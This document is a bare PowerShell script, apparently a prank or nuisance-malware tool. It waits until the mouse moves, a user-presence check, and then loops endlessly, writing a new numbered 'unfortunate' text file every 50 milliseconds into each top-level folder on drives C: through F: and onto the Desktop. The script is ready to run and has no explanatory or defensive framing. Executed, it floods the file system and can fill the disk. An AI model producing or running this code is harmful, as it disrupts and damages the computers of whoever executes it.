# Import the System.Windows.Forms assembly
Add-Type -AssemblyName System.Windows.Forms

# Store the original position of the cursor
$originalPOS = [System.Windows.Forms.Cursor]::Position

# Loop until the cursor position changes
while (1) {
    # Check if the cursor position has changed
    if ([Windows.Forms.Cursor]::Position -ne $originalPOS) {
        # If the cursor has moved, exit the loop
        break
    }
}

# At this point, the script will continue executing

$i = 1
while ($true) {
    # Get the list of available folders
    $folders = [System.IO.Directory]::GetDirectories("C:\")
    $folders += [System.IO.Directory]::GetDirectories("D:\")
    $folders += [System.IO.Directory]::GetDirectories("E:\")
    $folders += [System.IO.Directory]::GetDirectories("F:\")
    $folders += [Environment]::GetFolderPath("Desktop")

    # Create a text file in each folder
    foreach ($folder in $folders) {
        $fileName = "unfortunate$i.txt"
        $path = $folder + "\" + $fileName
        Set-Content $path -Value "This is an unfortunate text file $i."
    }

    $i++
    Start-Sleep -Milliseconds 50
}

